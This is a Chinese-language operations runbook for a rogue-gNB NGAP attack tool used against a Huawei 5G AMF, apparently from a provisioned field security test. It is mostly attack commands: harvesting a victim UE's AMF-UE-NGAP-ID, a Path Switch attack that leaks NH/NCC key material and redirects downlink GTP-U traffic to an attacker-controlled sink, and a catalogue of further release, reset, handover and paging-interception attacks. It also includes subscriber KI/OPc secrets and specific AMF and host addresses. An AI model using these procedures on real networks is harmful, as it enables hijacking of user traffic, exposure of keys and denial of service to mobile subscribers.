# 华为 AMF 操作手册（现场实测）

文件：`deploy/操作手册_华为AMF.md`。测试机是 **Ubuntu**。现场改不了代码，只按本节命令跑。
合法 UERANSIM 和流氓 ngap_tester 是同一个华为 AMF 上的两个 gNB。

**华为 AMF-UE-NGAP-ID 每次注册都随机。禁止 sweep。禁止用菜单里的 CASE id。**

---

## 这次只做 Path Switch

其它攻击先不要跑。全部命令在**仓库根目录**（能同时 `ls deploy/extract-ue-ids.sh config/huawei.json`）。
克隆目录叫什么都行，不要死记 `~/ngap_tester`。

---

### A. 准备（每个终端都先 `cd` 到仓库根）

```bash
ls deploy/extract-ue-ids.sh config/huawei.json
chmod +x deploy/*.sh deploy/real-amf/*.sh
./deploy/field-check.sh
```

| 终端 | 作用 | 命令 | 停不停 |
|---|---|---|---|
| A | 合法 gNB | `./deploy/real-amf/run-gnb.sh` | 一直开着 |
| B | 合法 UE | `./deploy/real-amf/run-ue.sh` | 一直开着 |
| D | 读 AU / 看数据面 | 见下面 | 用完即可 |
| E | 接被切走的下行 GTP-U | 攻击**之前**先开 | 一直开到打完 |
| C | 流氓 gNB，只发 path-switch | 见下面 | 打一条就退出 |

终端 A 看到 `NG Setup procedure is successful`。  
终端 B 看到 `Registration is successful` + `PDU Session establishment is successful`，并出现 `uesimtun0`。

### B. 确认会话和内网数据面（不要 ping 8.8.8.8）

```bash
./deploy/real-amf/check-up.sh
./deploy/real-amf/check-up.sh --n3
# 华为若给了 DNN 内网地址：
PING_TARGET=<地址> ./deploy/real-amf/check-up.sh
```

记下：`uesimtun0` 的 UE_IP、网关是否回包、`--n3` 是否看到 UDP 2152。  
有 UE_IP = 会话已建。N6 不回 ping 也继续（华为常禁 ICMP）。

### C. 读这一次的 AMF-UE-NGAP-ID（AU）

```bash
./deploy/extract-ue-ids.sh          # 不要 sudo
```

抄输出里的 **`amf-ngap-id`**，这就是 `$AU`。没有的话：

```bash
~/UERANSIM/build/nr-cli --dump
~/UERANSIM/build/nr-cli UERANSIM-gnb-460-08-1 --exec "ue-list"
```

gNB 名字以 `--dump` 里 `UERANSIM-gnb-` 那行为准。  
**禁止 sweep。禁止用上次的 AU。** UE 一重注册必须重读。

### D. 流氓侧探路（终端 C）

```bash
./deploy/ngt.sh sctp-ping
# 必须 SUCCESS，源 IP = 13.254.241.142
./deploy/ngt.sh ng-setup
# 必须 ACCEPTED。REJECT = 4660/PLMN/切片没开通，不要往下打
```

华为允许多条 SCTP，**不要停终端 A**。

### E. 开 GTP-U 接收（终端 E，先于攻击）

```bash
./deploy/ngt.sh gtpu-sink --bind-ip 13.254.241.142 --port 2152
```

保持开着。攻击前这里应接近安静（下行还在合法 gNB）。

### F. 只打 Path Switch（终端 C）

把 `<AU>` 换成 C 步抄的数字，不要改其它参数：

```bash
mkdir -p evidence
./deploy/ngt.sh --evidence evidence/huawei-path-switch.jsonl \
    path-switch --source-amf-ue-id <AU> --pdu-sessions 1
```

`--attacker-ip` 默认 `auto`，会绑到 `13.254.241.142`，不要改成实验室的 172.30。

### G. 怎么判断成没成（当场填）

**控制面（看终端 C 打印）：**

| 终端 C 打印（字面） | 记什么 |
|---|---|
| `=== CROSS-gNB DISCLOSURE CONFIRMED ===` 且 `LEAKED KEY MATERIAL: NCC=… NH=…` | **控制面成功**（主证据，把 NCC/NH 整行抄下来） |
| 还有 `LEAKED UPF N3 ENDPOINT` | 额外泄了 UPF 地址/TEID，整行抄下来 |
| `PathSwitchRequestAcknowledge` 但只有 `PDU … ack-transfer (no UL-TNL…)` | ACK 了、没泄 UPF N3；有没有 NH 分开记 |
| `PathSwitchRequestFailure` 或 `ErrorIndication` | 华为挡了，把 `reply:` 那一行整行抄下来 |
| `[path-switch] no reply (victim id likely not resolvable / rejected silently)` | AU 错/过期，或包没到。重做 C 步再打一次 |

**数据面（内网）：**

| 观察 | 成功切面时 | 没切面时 |
|---|---|---|
| 终端 E `gtpu-sink` | 出现 GTP-U | 仍然没有 |
| `check-up.sh --n3`（合法 gNB 的 2152） | 变少或没有 | 和打之前差不多 |
| `check-up.sh` ping 网关/`PING_TARGET` | 若本来通，现在可能断 | 和打之前一样 |

控制面有 NH、数据面没切：也算成立（Open5GS 2.8 就是这样）。两层都写进表。

### H. 本条记录表（复制下来填）

```
日期:
AU（amf-ngap-id）:
UE_IP / 网关 / ping 是否通（打前）:
N3 合法侧 2152 打前有没有:
sctp-ping:
ng-setup:
path-switch 回复（ACK/Failure/无回）:
NH:
NCC:
UPF N3（有则抄）:
gtpu-sink 打后有没有包:
合法侧 2152 打后:
ping 打后:
备注:
```

打完若还要复测：先让终端 B 的 UE 重新注册，**重新 C 步读 AU**，再从 E/F 来。

### 这次不要做

| 不要 | 原因 |
|---|---|
| `ue-release` / `error-indication` / `ng-reset` / 其它 `$NGT` | 这次只测 Path Switch |
| `sweep` | 华为 AU 随机 |
| 菜单「Run attack CASE by id」 | AU 写死 1，N3 写死 172.30.200.9 |
| `./run.sh`（Docker） | 连的是实验室核心网 |
| 停终端 A 再打 | 华为允许多条 SCTP；停了就没有受害 UE |

其它攻击以后按同样格式往手册后面加。下面第 3 节清单仅供对照，**现场先忽略**。

---

## 0. 现场已开户参数

| 项 | 值 | 写在哪 |
|---|---|---|
| IMSI | `460081111111113` | `deploy/real-amf/real-amf.env` |
| KI | `1234567890abcde1234567890abcde12` | 同上 |
| OPc | `FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF` | 同上（`UE1_OP_TYPE=OPC`） |
| PLMN | MCC `460` / MNC `08` | env + `config/huawei.json` |
| TAC | `1` | 同上 |
| S-NSSAI | SST `1` / SD `010101` | env 里 `0x010101`，json 里 `"010101"` |
| AMF | `14.66.2.5:38412` | 同上 |
| 本机源 IP | `13.254.241.142` | env `HOST_IP`；json `bind_ip` |
| 合法 gNB-ID | `1`（`NCI=0x000000010`） | env |
| 流氓 gNB-ID | `4660` | `huawei.json`（必须已被华为允许） |

改参数只改这两个文件，然后**重启**对应进程（脚本会重新渲染 yaml）。

---

## 1. 三个终端（参考；本次按文首 Path Switch 做）

都在**仓库根目录**。**先起合法侧，再起流氓侧。不要停 UERANSIM。**

```
终端 A  ./deploy/real-amf/run-gnb.sh      # 合法 gNB，保持开着
终端 B  ./deploy/real-amf/run-ue.sh       # 合法 UE，保持开着
终端 C  ./deploy/ngt.sh …                 # 流氓 gNB，一条命令一次关联
终端 D  ./deploy/extract-ue-ids.sh        # 读本次 AU（不要 sudo；抓包才 sudo --watch）
```

### 1.1 合法侧（若还没在跑）

```bash
# 仍在仓库根目录（能 ls 到 deploy/ 和 config/）
./deploy/real-amf/run-gnb.sh
# 终端 A 看到: NG Setup procedure is successful

./deploy/real-amf/run-ue.sh
# 终端 B 看到: Registration is successful
#              PDU Session establishment is successful
#              出现网卡 uesimtun0
```

内网**不要 ping 8.8.8.8**。UE 分到地址后：

```bash
./deploy/real-amf/check-up.sh          # 看 uesimtun0 的 IP、网关、ps-list，并 ping 网关
./deploy/real-amf/check-up.sh --n3     # 再抓 8 秒合法 gNB 上的 GTP-U(UDP 2152)
# 华为若给了 DNN 内网地址：
PING_TARGET=<内网地址> ./deploy/real-amf/check-up.sh
```

有 UE_IP = PDU 会话已建。网关/PING_TARGET 有回包 = N6 通。`--n3` 能看到 2152 = UPF↔gNB 在传。
Path Switch 后：合法侧 N3 应变少，`gtpu-sink` 上应出现包。

### 1.2 流氓侧先探路

```bash
./deploy/ngt.sh sctp-ping
# 成功: SUCCESS，源 IP 应为 13.254.241.142

./deploy/ngt.sh ng-setup
# 成功: NG Setup ACCEPTED
```

`sctp-ping` timeout 时：确认 `huawei.json` 的 `bind_ip` 是 `13.254.241.142`（和 UERANSIM
同一源 IP）。华为**允许多条 SCTP**，不必停合法 gNB。仍超时就抓包看 INIT 有没有 INIT-ACK，
以及本机是否真有这张地址：`ip -4 addr | grep 13.254.241.142`。

---

## 2. 怎么拿到「这一次」的受害者标识

华为 AU 随机，**每次 UE 重新注册都会变**。打完若 UE 重注册了，必须重读。

### 办法 A（推荐）：问 gNB 的 ue-list

AU 在 **gNB** 上，不在 UE 的 `info` 里。脚本会跑：

```text
nr-cli --dump
nr-cli UERANSIM-gnb-460-08-1 --exec "ue-list"
# amf-ngap-id: <这就是 AU>
```

```bash
./deploy/extract-ue-ids.sh
```

### 办法 A2：抓包（必须在注册过程中抓）

```bash
# 先开抓，再重启终端 B 的 run-ue.sh
sudo ./deploy/extract-ue-ids.sh --watch
# 或
sudo tcpdump -i any -s 0 -w /tmp/n2.pcap host 14.66.2.5 and sctp
# Ctrl-C 后
sudo ./deploy/extract-ue-ids.sh -r /tmp/n2.pcap
```

注册完再抓 20 秒，空结果是正常的。`InitialContextSetup` 里才一定有 AU。

### 办法 B：读 UERANSIM 日志

终端 A 默认日志往往不打印 AU。GUTI 看终端 B（nr-ue）。手动能跑：

```bash
~/UERANSIM/build/nr-cli --dump
~/UERANSIM/build/nr-cli UERANSIM-gnb-460-08-1 --exec "ue-list"
```

终端 B（nr-ue）搜 `GUTI` / `5G-S-TMSI` / `TMSI`，拆出：

| 字段 | 给谁 |
|---|---|
| AMF-UE-NGAP-ID | `--amf-ue-id` / `--source-amf-ue-id` |
| 5G-TMSI（8 hex） | `--tmsi` |
| AMF Set ID（10 bit） | `--amf-set-id` |
| AMF Pointer（6 bit） | `--amf-pointer` |

### 不要用

```bash
./deploy/ngt.sh sweep --attack ue-release --amf-range 1-2000   # 对华为无效
```

---

## 3. 以后要加的攻击（本次不要跑）

仓库里能跑的 CLI 都列在这里，**方便以后按 Path Switch 同样格式往文首后面加**。
华为现场这次只打 Path Switch。不要发 CASE id。

`<AU>` = **这一次**从合法 NGAP 读到的 AMF-UE-NGAP-ID。每条命令（除 sctp-ping / gtpu-sink）都会自己再做一次 NG Setup。

```bash
NGT=./deploy/ngt.sh
AU=<本次读到的数字>
```

### 3.0 全部 CLI 对照（18 条可跑 + 1 条华为不要用）

| # | 命令 | 要 AU？ | 开源上测过什么 |
|---|---|---|---|
| 1 | `sctp-ping` | 否 | L4 探路 |
| 2 | `ng-setup` | 否 | 流氓 gNB 被接受 |
| 3 | `path-switch` | 要 | 泄 {NH,NCC}，有的还泄 N3 |
| 4 | `ue-release` | 要 | 跨 gNB 释放 UE |
| 5 | `error-indication` | 要 | 跨 UE 释放 |
| 6 | `ng-reset` | 要 | Open5GS 曾崩 AMF |
| 7 | `handover-required` | 要 | 强制切换 |
| 8 | `ho-window-inject` | 要 | 自开 HO 窗 + p21/p09 |
| 9 | `ran-config-update` | 否 | 假 TAI 截寻呼 |
| 10 | `ul-ran-config-transfer` | 否（要目标 gNB-ID） | SON/Xn 盲中继 |
| 11 | `initial-ue` | 否（要 GUTI） | 用 5G-S-TMSI 开新上下文 |
| 12 | `chain-ps-release` | 要 | Path Switch 紧接着 Release |
| 13 | `chain-initue-release` | GUTI（AU 可选） | InitUE 再 Release |
| 14 | `handover-notify` | 要 | p09 |
| 15 | `pdu-notify` | 要 | p06 |
| 16 | `cell-trace` | 要 | p17 |
| 17 | `ul-ran-status` | 要 | p21 |
| 18 | `ul-nrppa` | 要 | p16 |
| 19 | `gtpu-sink` | 否 | 接被重定向的下行 |
| — | `sweep` | — | **华为 AU 随机，不要用** |

菜单里 `Handover Cancel` / `Uplink Non-UE NRPPa` 显示 TODO，现场不要点。华为也不要发 3.5 的 CASE id。

### 3.1 主线

```bash
$NGT path-switch --source-amf-ue-id $AU --pdu-sessions 1
$NGT ue-release --amf-ue-id $AU
$NGT error-indication --amf-ue-id $AU
$NGT ng-reset --targets ${AU}:1
$NGT handover-required --amf-ue-id $AU
$NGT ho-window-inject --amf-ue-id $AU --mode both
$NGT ran-config-update --listen 30
$NGT ul-ran-config-transfer --target-gnb-id 1
```

### 3.2 组合链 + 单独 InitialUE

```bash
$NGT chain-ps-release --source-amf-ue-id $AU --pdu-sessions 1

$NGT initial-ue --amf-set-id 0x<setid> --amf-pointer 0x<ptr> --tmsi <8hex>

$NGT chain-initue-release \
    --amf-set-id 0x<setid> --amf-pointer 0x<ptr> --tmsi <8hex> \
    --victim-amf-ue-id $AU --release-target both
```

### 3.3 新 5 条报文

```bash
$NGT handover-notify --amf-ue-id $AU
$NGT pdu-notify      --amf-ue-id $AU
$NGT cell-trace      --amf-ue-id $AU
$NGT ul-ran-status   --amf-ue-id $AU
$NGT ul-nrppa        --amf-ue-id $AU
```

### 3.4 数据面接收（配合 path-switch）

```bash
$NGT gtpu-sink --bind-ip 13.254.241.142 --port 2152
```

### 3.5 CASE 目录 —— 华为现场不要用

`docs/cases/` 和菜单「Run attack CASE by id」是实验室变体。代码里 **AU 写死为 1**，
Path Switch 的 N3 写死 `172.30.200.9`。在华为上发出去等于打一个不存在的 UE。
主线请只用上面的 `$NGT … --amf-ue-id $AU`。

下面只作对照（哪些变体曾经存在），**不要在华为菜单里发这些 id**：

| id | 报文 |
|---|---|
| p01-a/b/c/d/f | PathSwitchRequest 变体 |
| p02-a/b | UEContextReleaseRequest 变体 |
| p03-a/b/d | HandoverRequired 变体 |
| p04-a | HandoverCancel（无独立 CLI） |
| p05-a/b/e/f | PDUSessionResourceModifyIndication |
| p06-a | PDUSessionResourceNotify |
| p09-a | HandoverNotify |
| p11-a | RRCInactiveTransitionReport |
| p12-a | UERadioCapabilityInfoIndication |
| p13-a | SecondaryRATDataUsageReport |
| p14-a | LocationReport |
| p15-a | LocationReportingFailureIndication |
| p16-a | Uplink UE-assoc NRPPa |
| p17-a | CellTrafficTrace |
| p19-a | RANCPRelocationIndication |
| p21-a | UplinkRANStatusTransfer |
| p22-a | UplinkRANEarlyStatusTransfer |
| g01-a/b/d | NGReset 变体 |
| g02-a | RANConfigurationUpdate |
| g03-a/b | NGSetupRequest 变体 |
| g04-a | ErrorIndication（非 UE 关联） |
| g07-a | PWSRestartIndication |
| g08-a | PWSFailureIndication |
| g09-a | UplinkRANConfigurationTransfer |
| g10-a | Uplink Non-UE NRPPa（无独立 CLI） |
| g11-a | UplinkRIMInformationTransfer |

交互菜单发主线（选 `7` Huawei AMF）也可以，和 `$NGT` 是同一套包。

```bash
.venv/bin/python -m ngaptester.menu
./deploy/ngt.sh -h
```

---

## 4. 怎么判断「打中了」

同时看四边：

1. **终端 C（ngt）**：ACK / Error Indication / 无回 / 解码出的 NH·NCC·N3
2. **终端 B（UE）**：是否还 `CM-CONNECTED`、`uesimtun0` 是否还在、ping 是否断
3. **终端 A（合法 gNB）**：是否出现 UE Context Release / Radio link failure
4. **华为 AMF 日志**（若能看）：该 IMSI 上下文是否被释放、是否切到 gNB 4660

建议每条命令加证据文件：

```bash
$NGT --evidence evidence/huawei-path-switch.jsonl path-switch --source-amf-ue-id $AU
```

---

## 5. 现场记录表（华为是新靶，开源结论不能直接套）

**这次只填 sctp-ping / ng-setup / path-switch / gtpu-sink 四行。** 其它行留给以后。

| 攻击 | 发出 | AMF 回复 | 受害 UE | 合法 gNB | 备注 |
|---|---|---|---|---|---|
| sctp-ping | | | — | — | 源 IP= |
| ng-setup | | Accept / Reject | — | — | |
| path-switch | | | | | NH/NCC/N3? |
| ue-release | | | | | |
| error-indication | | | | | |
| ng-reset | | | | | AMF 是否还活着 |
| handover-required | | | | | |
| ho-window-inject | | | | | |
| ran-config-update | | | | | 截到 TMSI? |
| ul-ran-config-transfer | | | | | |
| initial-ue | | | | | 用 GUTI |
| chain-ps-release | | | | | |
| chain-initue-release | | | | | |
| gtpu-sink + path-switch | | | | | 是否收到下行 |
| handover-notify | | | | | |
| pdu-notify | | | | | |
| cell-trace | | | | | |
| ul-ran-status | | | | | |
| ul-nrppa | | | | | |

---

## 6. 常见问题

| 现象 | 处理 |
|---|---|
| `sctp-ping` timeout，UERANSIM 却通 | `huawei.json` 的 `bind_ip` 必须是 `13.254.241.142`。华为允许多条 SCTP，不用停合法 gNB。查本机是否有该地址、抓包看 INIT 有无 INIT-ACK |
| `ng-setup` REJECT | PLMN/TAC/切片/gNB 4660 / 源 IP 未在华为侧开通 |
| UE 认证失败 | IMSI/KI/OPc/PLMN 与开户不一致；首次 SQN re-sync 属正常 |
| 攻击「没反应」 | AU 已过期，或填成了 1 / 扫出来的假 ID。重新 `extract-ue-ids.sh` |
| `extract-ue-ids.sh` 是空的 | 注册完才抓的。先 `--watch` 再重启 UE；或直接 `./deploy/extract-ue-ids.sh` 走 nr-cli |
| 合法 UE 掉了还想打下一条 | 重新 `run-ue.sh`，重新读 AU，不要用旧数字 |
